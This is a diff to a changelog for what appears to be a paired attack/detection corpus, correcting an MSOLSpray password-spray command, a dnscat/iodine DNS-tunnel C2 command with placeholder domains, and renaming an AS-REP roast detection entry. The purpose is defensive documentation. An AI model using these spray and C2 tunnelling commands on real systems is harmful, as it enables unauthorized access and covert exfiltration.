@@ -71,6 +71,48 @@ GitHub Release; `sync-fanout.yml` then opens the Offense sync PR.
 
 ### Fixed
 
+- **Two red command lines invoked a flag and a binary that do not exist (#101).** Raised by
+  the weekly `/corpus-review` routine, and both are the class the command-line dimension was
+  added for: a line transcribed from what the tool *ought* to take rather than from what it
+  *does*. Nothing in this repo's CI reads a red command line — the pairing graph and slot
+  gates are structure, not existence — and neither entry is projected into a flat view, so
+  no byte-gate on either side of the fleet had ever read either one.
+
+  - **`valid-accounts-cloud`** — `MSOLSpray` was invoked with `--domain
+    <tenant>.onmicrosoft.com`. The tool takes `-u/--userlist`, `-p/--password`, `-o/--out`,
+    `-f/--force` and `--url`, and nothing else; argparse rejects the line before a single
+    request leaves the box. Nor was there a flag meant instead — the tenant rides in on the
+    userlist's UPNs, and `--url`, the one that looks plausible, is FireProx's endpoint, not
+    a tenant selector. The argument is simply deleted; the `az login` line below it already
+    carries `<tenant>.onmicrosoft.com`, so the entry loses nothing.
+
+  - **`dns-tunnel-c2`** — wrong twice, where the report caught once. `dnscat2-client` is the
+    *package*; the binary it puts on PATH is `dnscat` (`Usage: dnscat [args] [domain]`), so
+    the line was `command not found`. But the flags described the opposite of the technique:
+    inside `--dns`, `server=` is the upstream **resolver** the client sends queries through
+    and `domain=` is the delegated zone, so `server=<c2-domain>` put the C2 zone in the
+    resolver slot and, with no `domain=` at all, selected dnscat's *direct-connection* mode —
+    a session straight to a host, not a tunnel through the DNS hierarchy. That contradicted
+    the entry's own prose (an "attacker-controlled authoritative nameserver", beacons
+    "encoded into a long subdomain label", "a burst of unique names under one parent zone" is
+    delegated-zone mode and nothing else), and it contradicted the `iodine -f -P
+    <shared-secret> <c2-domain>` line directly above it, which is the same idea done right.
+    Now `dnscat --secret=<key> <c2-domain>`: upstream's own recommended invocation for a
+    delegated zone, and the same shape as the iodine line, so the fence teaches one idea
+    twice instead of two ideas once. The explicit `--dns domain=<c2-domain>` form is
+    identical in effect and was passed over deliberately — it costs two more tokens to get
+    wrong in the one entry that got them wrong, and the distinction it would teach now sits
+    in the comment, where a reader gets it without being handed a command to demonstrate it.
+    The prose is unchanged: it was already right, and it is what convicted the command.
+
+  **The binary rename has a consumer.** `dotfiles-Offense`'s corpus-command gate (its #208)
+  resolves the first token of every red command line against `install/corpus-commands.lst`,
+  which classifies `dnscat2-client` as `pkg:dnscat2`. That line must become `dnscat` in the
+  **same commit** that vendors this corpus: pre-landed it is a stale classification,
+  post-landed it is an unresolved command, and the gate exits 2 either way.
+  `install/offensive-packages.txt`'s `dnscat2` comment carries the same factual error one
+  layer down and should go in the same commit.
+
 - **The README's corpus count had drifted by twelve.** It said "90 paired
   attack/detection concepts", which was exact when it was written — 92 red entries, two
   of them unpaired — and then eleven pairs landed without it. Recomputed from the tree:
@@ -152,6 +194,42 @@ GitHub Release; `sync-fanout.yml` then opens the Offense sync PR.
   needs a package-index source of truth for tools the runner cannot install, which is
   design work rather than an increment. htpx is the source of truth, so a defect
   caught downstream has already shipped. (#93)
+
+- **`asrep-probing-4771` is renamed `asrep-roast-4768`.** The slug named an event the
+  entry deliberately does not query. Its `event_ids` has been `[4768]` alone since
+  v2.8.2 dropped the secondary `4771 Failure_Code=0x18` arm as a noisier duplicate of
+  `password-spray-4625`'s primary; its title already said *4768 no-preauth*; and its
+  closing paragraph explicitly disowns `4771`, handing it to that entry. The `4771` was
+  a fossil of the v2.4.0 retarget, which changed what the entry detects without changing
+  what it is called. Every sibling in the Kerberos set — `kerberoasting-4769`,
+  `dcsync-4662`, `golden-ticket-4769`, `password-spray-4625` — is
+  `<technique>-<primary event>` and means it; this was the only one whose suffix named
+  an event it excludes.
+
+  **`asrep-roast`, not `asrep-probing`.** "Probing" *is* the `4771` enumeration concept
+  this entry rejects — the entry is about the roast, which succeeds and therefore never
+  emits a `4771` failure at all. `dotfiles-Defense` arrived at the same word
+  independently when it named its rule `asrep_roast_4768.yml`, which is the best
+  available evidence for what a second reader calls this.
+
+  **An entry `id` is a public surface, so this is a breaking change** — the next release
+  cutting it is a **major** bump, per the rule in `.claude/commands/release-readiness.md`.
+  Consumers cite entries by id and by path: `dotfiles-Offense` wraps this one in a
+  `companion:gen` marker in `PURPLE-TEAM.md`, and `dotfiles-Defense` cites its file URL
+  from two Sigma rules and a generated coverage row. Neither is reachable from this
+  repo's gates — `ci.yml` verifies the pairing graph, and nothing here can see a
+  downstream marker or citation.
+
+  **The fan-out is ordering-sensitive and must be done by hand before the release.**
+  `sync-fanout.yml` runs Offense's `gen-views.sh` before it commits, and that script
+  hard-fails (exit 2, in both `--check` and bare mode) on a marker naming an id with no
+  entry — so a release cut before Offense's markers are updated aborts the sync with no
+  PR, *after* `auto-tag.yml` has already published the tag and Release. The reverse
+  order reddens Offense's own drift gate. Both consumers are sha-pinned, so the window
+  between this commit and that fix is safe; it just needs to be short. (#103)
+
+  The v2.8.2 and v2.4.0 notes below keep the old name: they are history, and were true
+  when written. This bullet is the forward pointer.
 
 ## [v2.10.1] - 2026-08-22
 
